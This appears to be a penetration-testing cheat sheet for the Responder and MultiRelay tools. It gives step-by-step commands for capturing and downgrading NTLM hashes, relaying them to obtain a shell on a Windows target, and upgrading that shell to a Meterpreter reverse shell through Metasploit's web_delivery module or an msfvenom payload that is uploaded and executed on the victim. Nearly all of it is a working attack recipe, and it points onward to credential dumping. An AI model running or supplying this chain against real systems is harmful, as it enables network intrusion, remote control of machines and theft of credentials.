Responder can capture NTLMv1 and NTLMv2 hashes.

# Compile EXEs
```bash
# The EXEs that come with MultiRelay are compiled x86-64.
# If 32-bit EXEs are required, recompile them from source code.
rm /usr/share/responder/tools/MultiRelay/bin/Runas.exe  
rm /usr/share/responder/tools/MultiRelay/bin/Syssvc.exe

i686-w64-mingw32-gcc /usr/share/responder/tools/MultiRelay/bin/Runas.c -o /usr/share/responder/tools/MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv
i686-w64-mingw32-gcc /usr/share/responder/tools/MultiRelay/bin/Syssvc.c -o /usr/share/responder/tools/MultiRelay/bin/Syssvc.exe -municode
```

# Disable Servers
```bash
vi /usr/share/resonder/Responder.conf
SMB = Off
HTTP = Off
```

# Establish Shell
### Establish MultiRelay Shell
```bash
# Establish MultiRelay shell
./MultiRelay.py -t <Target Host> -u ALL
# If responder is running before MultiRelay, responder will listen on ports 80 and 443 and prevent MultiRelay from running.
# Disabling those servers in Responder.conf may prevent this.
responder -I eth1 --lm
# --lm attempts to downgrade NTLMv1 or NTLMv2 to LM hashes.
```
### Upgrade MultiRelay Shell to Meterpreter Shell
```bash
### Option 1 - Metasploit module
msfconsole
use exploit/multi/script/web_delivery
set LHOST <IP Address or Interface>

show targets
set TARGET 3
set PAYLOAD windows/meterpreter/reverse_tcp
run

# Copy the returned command into the MultiRelay shell

### Option 2 - msfvenom payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Attack Machine> LPORT=<Port #> -f exe > payload.exe

use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <Attack Machine>
set LPORT <Port #>
run -j # Run in background

# From MetaRelay shell
upload payload.exe # Uploads to C:\Windows\temp
# Execute
C:\Windows\temp\payload.exe
```
### [Dump Credentials and Hashes](../../Metasploit/README.md#Dump-Clear-Text-Credentials-and-Hashes)

# References
[Github](https://github.com/lgandx/Responder-Windows)